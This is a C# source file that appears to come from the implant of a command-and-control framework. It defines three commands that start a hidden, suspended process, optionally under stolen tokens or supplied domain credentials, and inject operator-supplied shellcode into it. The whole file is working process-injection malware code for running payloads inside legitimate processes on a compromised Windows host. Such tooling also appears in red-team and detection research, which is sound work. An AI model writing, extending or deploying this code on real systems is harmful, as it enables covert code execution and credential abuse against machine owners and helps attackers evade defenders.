using Agent.Helpers;
using Agent.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using WinAPI;
using WinAPI.Wrapper;

namespace Agent.Commands
{
    public class SpawnInjectCommand : AgentCommand
    {
        public override string Name => "inject-spawn";

        protected virtual bool RedirectOutput { get; set; } = false;

        public override void InnerExecute(AgentTask task, AgentCommandContext context)
        {

            this.CheckFileDownloaded(task, context);

            var file = context.FileService.ConsumeDownloadedFile(task.FileId);
            var shellcode = file.GetFileContent();

            try
            {

                var creationParms = new ProcessCreationParameters()
                {
                    Application = context.ConfigService.SpawnToX64,
                    RedirectOutput = this.RedirectOutput,
                    CreateNoWindow = true,
                    CreateSuspended = true,
                    CurrentDirectory = Environment.CurrentDirectory
                };

                if (ImpersonationHelper.HasCurrentImpersonation)
                    creationParms.Token = ImpersonationHelper.ImpersonatedToken;

                var procResult = APIWrapper.CreateProcess(creationParms);

                APIWrapper.Inject(procResult.ProcessHandle, procResult.ThreadHandle, shellcode, context.ConfigService.APIInjectionMethod);

                if (creationParms.RedirectOutput)
                    APIWrapper.ReadPipeToEnd(procResult.ProcessId, procResult.OutPipeHandle, output => context.AppendResult(output, false));
                else
                    context.AppendResult($"Injection succeed.");
            }
            catch (Exception ex)
            {
                context.Error($"Injection failed : {ex}");
                return;
            }


        }
    }

    public class SpawnWaitInjectCommand : SpawnInjectCommand
    {
        public override string Name => "inject-spawn-wait";

        protected override bool RedirectOutput => true;

     
    }

    public class SpawnInjectAsCommand : SpawnInjectCommand
    {
        public override string Name => "inject-spawnas";

        protected override bool RedirectOutput => true;

        public override void InnerExecute(AgentTask task, AgentCommandContext context)
        {
            string usr = task.SplittedArgs[0];
            string password = task.SplittedArgs[1];

            var tab = usr.Split('\\');
            var username = tab[1];
            var domain = tab[0];

            this.CheckFileDownloaded(task, context);

            var file = context.FileService.ConsumeDownloadedFile(task.FileId);
            var shellcode = file.GetFileContent();

            try
            {
                ProcessCredentials creds = new ProcessCredentials()
                {
                    Domain = domain,
                    Username = username,
                    Password = password,
                };

                var creationParms = new ProcessCreationParameters()
                {
                    Application = context.ConfigService.SpawnToX64,
                    RedirectOutput = this.RedirectOutput,
                    CreateNoWindow = true,
                    CreateSuspended = true,
                    CurrentDirectory = Environment.CurrentDirectory,
                    Credentials = creds,

                };

                if (ImpersonationHelper.HasCurrentImpersonation)
                    creationParms.Token = ImpersonationHelper.ImpersonatedToken;

                var procResult = APIWrapper.CreateProcess(creationParms);

                APIWrapper.Inject(procResult.ProcessHandle, procResult.ThreadHandle, shellcode, context.ConfigService.APIInjectionMethod);

                if (creationParms.RedirectOutput)
                    APIWrapper.ReadPipeToEnd(procResult.ProcessId, procResult.OutPipeHandle, output => context.AppendResult(output, false));
                else
                    context.AppendResult($"Injection succeed.");
            }
            catch (Exception ex)
            {
                context.Error($"Injection failed : {ex}");
                return;
            }


        }
    }
}
